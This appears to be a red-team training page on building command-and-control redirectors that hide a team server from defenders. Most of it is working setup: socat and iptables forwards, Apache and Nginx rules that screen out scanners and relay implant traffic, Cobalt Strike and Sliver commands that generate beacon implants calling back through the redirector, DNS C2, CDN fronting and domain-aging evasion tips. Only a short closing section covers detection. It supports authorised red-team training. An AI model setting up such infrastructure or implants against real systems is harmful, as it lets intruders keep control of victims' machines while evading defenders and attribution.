---
layout: training-page
title: "C2 Redirectors — Red Team Academy"
module: "C2 Frameworks"
tags:
  - redirectors
  - infrastructure
  - c2
  - opsec
page_key: "c2-redirectors"
render_with_liquid: false
---

# C2 Redirectors

## What is a Redirector?

A redirector (also called a relay or proxy) is an intermediate server that sits between the implant on the victim and the actual C2 team server. The implant communicates with the redirector; the redirector forwards traffic to the team server. The goal is to **hide the team server's real IP from defenders and threat intel**. If a SOC burns a redirector, you swap it out — your team server remains operational and unattributed.

- **Dumb pipe redirector** — simple TCP/UDP port forward, no inspection. Fast, but all traffic passthrough is visible in logs.
- **Smart redirector** — inspects the request (User-Agent, URI pattern, headers) and only forwards valid C2 traffic; returns a 404 or redirect for everything else.
- **Domain fronting** — abuses a CDN so that SNI/DNS shows a legitimate CDN domain while the HTTP Host header routes to your server. Difficult for defenders to block without disrupting the CDN.

## Infrastructure Layout

```
# Recommended tiered C2 infrastructure:
#
#  [Implant] → [Redirector 1 (VPS)] → [Redirector 2 (optional CDN)] → [Team Server]
#
# Rules:
#  - Team server has NO public exposure — firewall allows only redirector IPs
#  - Redirectors are cheap VPS nodes, expendable
#  - Use different providers for each tier (Digital Ocean, Vultr, OVH, etc.)
#  - Never let the implant connect directly to the team server IP
#  - Burn-and-replace strategy: if a redirector is blocked, spin up a new one
#    and update the malleable profile / listener domain

# Cobalt Strike team server firewall rules (iptables):
# Allow redirectors to reach beacon port (443):
iptables -A INPUT -p tcp --dport 443 -s <REDIRECTOR_IP> -j ACCEPT
# Allow DNS redirector:
iptables -A INPUT -p udp --dport 53 -s <REDIRECTOR_IP> -j ACCEPT
# Block everything else to team server ports:
iptables -A INPUT -p tcp --dport 443 -j DROP
iptables -A INPUT -p tcp --dport 80 -j DROP

# Sliver equivalent (firewall on team server):
ufw allow from <REDIRECTOR_IP> to any port 8443
ufw deny 8443
```

## socat — Dumb TCP Redirector

`socat` is the simplest redirector: a raw TCP port forward. No inspection, no filtering. Good for lab use or as a first-hop redirector where a smart filter is not needed.

```
# Forward local port 443 to team server port 443:
socat TCP4-LISTEN:443,fork TCP4:<TEAM_SERVER_IP>:443 &

# Forward port 80:
socat TCP4-LISTEN:80,fork TCP4:<TEAM_SERVER_IP>:80 &

# Run persistently with nohup:
nohup socat TCP4-LISTEN:443,fork TCP4:<TEAM_SERVER_IP>:443 >/dev/null 2>&1 &

# As a systemd service (recommended for ops):
cat > /etc/systemd/system/redirector.service <<'EOF'
[Unit]
Description=C2 Redirector
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP4-LISTEN:443,fork TCP4:<TEAM_SERVER_IP>:443
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now redirector
```

## iptables — Kernel-Level Port Forwarding

iptables PREROUTING rules forward traffic at the kernel level — lower overhead than socat, survives process death, and survives reboots when saved. Best for dumb-pipe forwarding where performance matters.

```
# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward
# Persist:
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf && sysctl -p

# Forward incoming port 443 to team server:
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <TEAM_SERVER_IP>:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Forward port 80:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <TEAM_SERVER_IP>:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Save rules (Debian/Ubuntu):
apt install iptables-persistent -y
netfilter-persistent save

# View current NAT table:
iptables -t nat -L -n -v

# Flush if needed:
iptables -t nat -F
```

## Apache mod_rewrite — Smart Redirector

Apache with `mod_rewrite` is the most common smart redirector. It inspects incoming requests and only forwards traffic that matches your C2 profile's URI pattern and User-Agent. Everything else gets a benign response or a redirect to a real website — making the redirector appear as a normal web server to scanners.

```
# Install Apache and required modules:
apt install apache2 -y
a2enmod rewrite proxy proxy_http ssl headers

# Enable the proxy pass through (disable default proxy deny):
# In /etc/apache2/apache2.conf — add or confirm:
# ProxyRequests Off

# /etc/apache2/sites-available/redirector.conf:
cat > /etc/apache2/sites-available/redirector.conf <<'EOF'
<VirtualHost *:80>
    ServerName yourdomain.com

    # Log to separate file for review:
    LogLevel alert rewrite:trace3
    ErrorLog /var/log/apache2/redirector-error.log
    CustomLog /var/log/apache2/redirector-access.log combined

    RewriteEngine On

    # Rule 1: Block known scanners and researchers (return 404):
    RewriteCond %{HTTP_USER_AGENT} "curl|python|masscan|nmap|zgrab|shodan" [NC]
    RewriteRule ^.*$ - [F,L]

    # Rule 2: Forward valid C2 traffic (matching your malleable profile URI):
    # Example: only forward requests to /updates/* with your C2 User-Agent:
    RewriteCond %{REQUEST_URI} ^/updates/.*$
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10\.0; Win64; x64\)" [NC]
    RewriteRule ^(.*)$ http://<TEAM_SERVER_IP>:80$1 [P,L]

    # Rule 3: Everything else — redirect to a legitimate site (looks normal):
    RewriteRule ^.*$ https://www.microsoft.com [R=302,L]
</VirtualHost>
EOF

a2ensite redirector.conf
a2dissite 000-default.conf
systemctl reload apache2
```

## Apache HTTPS Redirector with Let's Encrypt

Implants connecting over HTTPS to a legitimate-looking domain with a valid TLS certificate are harder to block. Defenders cannot inspect the payload without MitM'ing the TLS session.

```
# Install Certbot and get a certificate:
apt install certbot python3-certbot-apache -y
certbot --apache -d yourdomain.com --non-interactive --agree-tos -m you@email.com

# After cert issuance, the HTTPS vhost:
cat > /etc/apache2/sites-available/redirector-ssl.conf <<'EOF'
<VirtualHost *:443>
    ServerName yourdomain.com

    SSLEngine On
    SSLCertificateFile    /etc/letsencrypt/live/yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem

    RewriteEngine On

    # Block scanners:
    RewriteCond %{HTTP_USER_AGENT} "curl|python|masscan|nmap|zgrab" [NC]
    RewriteRule ^.*$ - [F,L]

    # Forward valid C2 beacon traffic:
    RewriteCond %{REQUEST_URI} ^/cdn/assets/.*$
    RewriteRule ^(.*)$ https://<TEAM_SERVER_IP>:443$1 [P,L]

    # Proxy SSL settings (pass through to team server):
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

    # Redirect everything else:
    RewriteRule ^.*$ https://www.google.com [R=302,L]
</VirtualHost>
EOF

a2ensite redirector-ssl.conf
systemctl reload apache2
```

## Nginx — Smart Redirector

Nginx can perform the same smart filtering with `proxy_pass` and `if` blocks. Useful when you prefer Nginx or need its performance characteristics for high-volume ops.

```
# /etc/nginx/sites-available/redirector:
server {
    listen 443 ssl;
    server_name yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # Block common scanners:
    if ($http_user_agent ~* "(curl|python|masscan|nmap|zgrab|shodan)") {
        return 404;
    }

    # Forward C2 URIs to team server:
    location ~ ^/api/v2/ {
        # Only forward if User-Agent matches your profile:
        if ($http_user_agent !~* "Mozilla/5.0") {
            return 302 https://www.microsoft.com;
        }
        proxy_pass https://<TEAM_SERVER_IP>:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Default — redirect to legitimate site:
    location / {
        return 302 https://www.microsoft.com;
    }
}

# Enable and reload:
# ln -s /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
# nginx -t && systemctl reload nginx
```

## Cobalt Strike — Listener with Redirector

In Cobalt Strike, the Beacon listener is configured with the redirector domain/IP as the callback host. The team server address is never exposed to the implant.

```
# Cobalt Strike listener configuration (GUI):
# Listeners → Add
#   Name:        HTTPS-Redirector
#   Payload:     windows/beacon_https/reverse_https
#   HTTPS Hosts: yourdomain.com          ← redirector domain, NOT team server
#   HTTPS Port:  443
#   Profile:     (your malleable C2 profile)

# The malleable profile URI patterns must match what your Apache/Nginx
# redirector is configured to forward.

# Example: Cobalt Strike malleable profile snippet for matching above Apache rule:
# http-get {
#     set uri "/updates/beacon";
#     client {
#         header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
#     }
# }

# Team server startup with profile:
# ./teamserver <TEAM_SERVER_IP> <password> /path/to/profile.c2
```

## Sliver — Listener with Redirector

Sliver HTTP/S listeners are configured to listen locally on the team server. The redirector forwards traffic from the public redirector IP to the team server's listener port.

```
# On team server — start HTTPS listener (bound to all interfaces or loopback):
sliver > https -L 0.0.0.0 -l 443

# Generate implant pointing at the redirector domain:
sliver > generate beacon --http https://yourdomain.com --os windows --save /tmp/beacon.exe
# The implant will callback to yourdomain.com (redirector)
# Redirector forwards to team server IP:443

# Team server firewall: only allow redirector IP on port 443:
ufw allow from <REDIRECTOR_IP> to any port 443
ufw deny 443
```

## CDN as Redirector

Placing a CDN (Cloudflare, AWS CloudFront, Azure CDN) in front of your team server provides an additional layer of indirection. The implant communicates with the CDN's IP ranges — blocking these ranges would impact legitimate services.

```
# Cloudflare as redirector (free tier works):
# 1. Register a domain and add it to Cloudflare
# 2. Create an A record pointing to your team server IP (proxy enabled — orange cloud)
# 3. Cloudflare proxies requests to your team server
# 4. Your team server sees Cloudflare IPs, not implant IPs
# 5. Implant communicates with Cloudflare IPs (e.g., 104.21.x.x)

# Cloudflare firewall rules (in CF dashboard) — restrict team server access:
# Only allow Cloudflare IPs on team server port 80/443
# Cloudflare IP ranges: https://www.cloudflare.com/ips/

# iptables to allow only Cloudflare IPs (download current ranges):
# for ip in $(curl -s https://www.cloudflare.com/ips-v4); do
#   iptables -A INPUT -p tcp --dport 443 -s $ip -j ACCEPT
# done
# iptables -A INPUT -p tcp --dport 443 -j DROP

# Caveat: Cloudflare TOS prohibits this use. AWS CloudFront is more permissive.
# Domain fronting via CloudFront requires valid distribution config.
```

## DNS Redirector

For DNS-based C2 (Sliver DNS listener, DNScat2), a DNS redirector forwards DNS queries from the victim to the team server's DNS listener using iptables or a lightweight DNS proxy.

```
# DNS port forward (iptables — simplest):
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination <TEAM_SERVER_IP>:53
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination <TEAM_SERVER_IP>:53
iptables -t nat -A POSTROUTING -j MASQUERADE

# DNS NS delegation (preferred for realism):
# 1. Register your C2 domain: c2ops.com
# 2. Create NS records pointing your subdomain to the redirector IP:
#    ns1.c2ops.com → <REDIRECTOR_IP>
# 3. Create NS delegation: dns.c2ops.com NS ns1.c2ops.com
# 4. All DNS queries for *.dns.c2ops.com now go to your redirector
# 5. Redirector forwards to team server DNS listener

# Sliver DNS listener (team server):
sliver > dns --domains dns.c2ops.com

# Sliver DNS implant:
sliver > generate --dns dns.c2ops.com --os windows --save /tmp/dns_implant.exe
```

## Redirector Operational Tips

- **Age your domains** — Newly registered domains are flagged by threat intel. Register C2 domains weeks before an engagement and let them age with legitimate-looking traffic.
- **Categorize your domain** — Submit the domain to Bluecoat, Symantec, and Cisco Umbrella for categorization as "Technology" or "Business" before the engagement. Uncategorized domains are blocked by many proxies.
- **Match URI patterns to your profile** — The redirector's forwarding rules must exactly match what your C2 profile sends. A mismatch causes the redirector to serve 404s to your own implants.
- **Use different providers for each tier** — Redirector VPS on Digital Ocean, team server on a dedicated host. Diversity across registrars and hosters limits takedown blast radius.
- **Monitor redirector logs** — Unexpected high-volume scanning or unusual User-Agents targeting your redirector indicate discovery. Rotate before the team server is attributed.
- **Expire implants** — Configure killdate in your C2 profile. Implants that outlive the engagement window and callback to a dead redirector create noise and potentially evidence.

## Detection — Blue Team Perspective

```
# Indicators that a redirector has been identified:
# - Your redirector domain appears in threat intel feeds (VirusTotal, URLhaus)
# - Beacon traffic suddenly stops (implant can't reach redirector — ISP null-routed)
# - Passive DNS shows your redirector IP with an unusual number of subdomains
# - Certificate transparency logs reveal your C2 domain before engagement start

# SOC hunting queries (if you were the defender):
# 1. Look for beaconing patterns — connections to the same external IP every N seconds
#    KQL: DeviceNetworkEvents | summarize count() by RemoteIP, RemotePort, bin(Timestamp, 1m)
#         | where count_ > 10   ← regular interval is suspicious
#
# 2. JA3/JA3S fingerprinting — TLS fingerprint of Cobalt Strike HTTPS is well-known
#    Network sensors (Zeek, Suricata) alert on known Cobalt Strike JA3 hashes
#
# 3. HTTP Host header mismatch (domain fronting) — SNI != HTTP Host header
#    Zeek ssl.log + http.log join on connection UID to compare
#
# 4. Certificate age — newly issued certs for newly registered domains are suspicious
#    Let's Encrypt certs are 90 days; a cert issued the same day as the domain = red flag
```
